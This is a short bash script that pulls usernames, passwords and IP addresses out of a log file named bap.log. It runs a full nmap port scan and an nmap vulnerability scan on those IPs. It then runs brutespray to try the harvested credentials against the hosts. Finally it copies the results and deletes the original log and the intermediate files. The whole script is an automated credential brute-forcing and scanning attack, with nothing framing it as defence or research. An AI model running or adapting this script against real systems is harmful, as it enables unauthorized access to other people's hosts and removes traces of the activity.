#!/bin/bash
awk '{print $4}' bap.log > cred.txt
cat cred.txt | cut -d ':' -f2 > password.txt
cat cred.txt | cut -d ':' -f1 > username.txt
awk '{print $1}' bap.log > ip.txt
nmap -iL ip.txt -Pn -p- --max-retries 1 --max-rate 500 --max-scan-delay 20 -T4 -v -oN host.gnmap 
brutespray --file host.gnmap -U username.txt -P password.txt --threads 5 --hosts 5
nmap -iL ip.txt -Pn -sV --script vuln -oN Vulns.gnmap

cp username.txt uname.txt
cp password.txt pass.txt
cp host.gnmap fhost.gnmap
cp ip.txt fip.txt
rm cred.txt
rm bap.log
rm ip.txt
rm username.txt
rm password.txt
rm host.gnmap
